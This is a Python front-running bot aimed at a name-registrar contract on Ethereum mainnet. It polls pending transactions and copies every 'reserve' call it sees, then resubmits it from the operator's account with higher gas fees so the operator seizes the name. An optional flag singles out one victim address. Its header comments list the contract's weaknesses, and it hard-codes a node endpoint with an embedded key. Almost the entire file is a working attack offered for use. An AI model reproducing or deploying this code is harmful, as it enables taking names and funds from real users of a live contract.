#
# .OG is fake extension LNR names has no extension as can be seen in the newly verified contract
# no front running protection
# same return value if success or failure
# no names > 32 bytes as the bytes32 type used in the contract (no long repeating emojis..)
#

import os
from web3 import Web3, HTTPProvider
import asyncio
import json
from eth_account import Account
from eth_account.signers.local import LocalAccount
import argparse

class OGRunner:
    def __init__(self, args):
        self.provider = "https://side-blue-leaf.quiknode.pro/5afa975ca6a7fd7433fa88e291ca41075608c5c6/"
        self.w3 = Web3(HTTPProvider(self.provider))

        self.pkey = os.getenv("PKEY")
        self.ETH_ACCOUNT: LocalAccount = Account.from_key(self.pkey)

        self.og_addr = "0x5564886ca2C518d1964E5FCea4f423b41Db9F561"
        self.og_abi = """[{"constant": true,"inputs": [{"name": "_owner","type": "address"}],"name": "name","outputs": [{"name": "o_name","type": "bytes32"}],"type": "function","payable": false,"stateMutability": "view"},{"constant": true,"inputs": [{"name": "_name","type": "bytes32"}],"name": "owner","outputs": [{"name": "","type": "address"}],"type": "function","payable": false,"stateMutability": "view"},{"constant": true,"inputs": [{"name": "_name","type": "bytes32"}],"name": "content","outputs": [{"name": "","type": "bytes32"}],"type": "function","payable": false,"stateMutability": "view"},{"constant": true,"inputs": [{"name": "_name","type": "bytes32"}],"name": "addr","outputs": [{"name": "","type": "address"}],"type": "function","payable": false,"stateMutability": "view"},{"constant": false,"inputs": [{"name": "_name","type": "bytes32"}],"name": "reserve","outputs": [],"type": "function","payable": true,"stateMutability": "payable"},{"constant": true,"inputs": [{"name": "_name","type": "bytes32"}],"name": "subRegistrar","outputs": [{"name": "o_subRegistrar","type": "address"}],"type": "function","payable": false,"stateMutability": "view"},{"constant": false,"inputs": [{"name": "_name","type": "bytes32"},{"name": "_newOwner","type": "address"}],"name": "transfer","outputs": [],"type": "function","payable": true,"stateMutability": "payable"},{"constant": false,"inputs": [{"name": "_name","type": "bytes32"},{"name": "_registrar","type": "address"}],"name": "setSubRegistrar","outputs": [],"type": "function","payable": true,"stateMutability": "payable"},{"constant": false,"inputs": [],"name": "Registrar","outputs": [],"type": "function","payable": true,"stateMutability": "payable"},{"constant": false,"inputs": [{"name": "_name","type": "bytes32"},{"name": "_a","type": "address"},{"name": "_primary","type": "bool"}],"name": "setAddress","outputs": [],"type": "function","payable": true,"stateMutability": "payable"},{"constant": false,"inputs": [{"name": "_name","type": "bytes32"},{"name": "_content","type": "bytes32"}],"name": "setContent","outputs": [],"type": "function","payable": true,"stateMutability": "payable"},{"constant": false,"inputs": [{"name": "_name","type": "bytes32"}],"name": "disown","outputs": [],"type": "function","payable": true,"stateMutability": "payable"},{"constant": true,"inputs": [{"name": "_name","type": "bytes32"}],"name": "register","outputs": [{"name": "","type": "address"}],"type": "function","payable": false,"stateMutability": "view"},{"anonymous": false,"inputs": [{"indexed": true,"name": "name","type": "bytes32"}],"name": "Changed","type": "event"},{"anonymous": false,"inputs": [{"indexed": true,"name": "name","type": "bytes32"},{"indexed": true,"name": "addr","type": "address"}],"name": "PrimaryChanged","type": "event"},{"type": "fallback","payable": true,"stateMutability": "payable"}]"""
        self.og_contract = self.w3.eth.contract(address=self.og_addr, abi=json.loads(self.og_abi))
        self.target = args.target
        return

    def get_transactions(self):
        tx_filter = self.w3.eth.filter('pending')
        loop = asyncio.get_event_loop()
        try:
            loop.run_until_complete(
                asyncio.gather(
                    self.log_loop(tx_filter, 0)
                    ))
        finally:
            loop.close()

    def handle_event(self, tx):
        params = self.og_contract.decode_function_input(tx["input"])
        reserve = "0x432ced04"
        if tx["input"][0:10] == reserve:
            self.replay_tx(params[1], tx)

    async def log_loop(self, event_filter, poll_interval):
        while True:
            for event in self.w3.eth.get_filter_changes(event_filter.filter_id):
                try:
                    tx = self.w3.eth.get_transaction(event)
                    #sumbody special
                    if self.target:
                        if tx['to'] == self.og_addr and tx['from'] == self.target:
                            self.handle_event(tx)
                    #a lil fr for erbody        
                    else:    
                        if tx['to'] == self.og_addr:
                            self.handle_event(tx)
                except Exception as e:
                    continue
            await asyncio.sleep(poll_interval)

    def replay_tx(self, data, tx):
        print(f"j4cking: {data['_name'].decode('utf-8')} from {tx['from']}")
        nonce = self.w3.eth.getTransactionCount(self.ETH_ACCOUNT.address)

        tx_info = {
            'chainId': 1,
            'from': self.ETH_ACCOUNT.address,
            'to': self.og_addr,
            'nonce': nonce,
            'gas': tx['gas'],
            'maxFeePerGas': tx['maxFeePerGas'] + 100,
            'maxPriorityFeePerGas': tx['maxPriorityFeePerGas'] + 100,
            'data': tx['input']
        }

        print("[+] s3nd1ng tx.")
        signed_tx = self.w3.eth.account.sign_transaction(tx_info, self.pkey)
        send_tx = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        print("[+] tx hash %s " % self.w3.toHex(send_tx))
        print("[+] w41t1ng 0n tr4ns4ct1on t0 b3 m1n3d")
        self.w3.eth.wait_for_transaction_receipt(send_tx)
        print("[+] tx mined")
        owner = self.og_contract.functions.owner(data['_name']).call()
        if self.ETH_ACCOUNT.address == owner:
            print("Congr4tz! you won the race!!")
        else:
            print("2slow")

    def main(self):
        print("[+] OGFR - lcfr")
        if self.target:
            print(f". only front running {self.target}")

        self.get_transactions()
        return


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="FRFR - lcfr.eth\n")
    parser.add_argument("--target", dest="target", type=str,
                        help="enable flashbots relay.",
                        default=None)
    args = parser.parse_args()
    main = OGRunner(args)
    main.main()
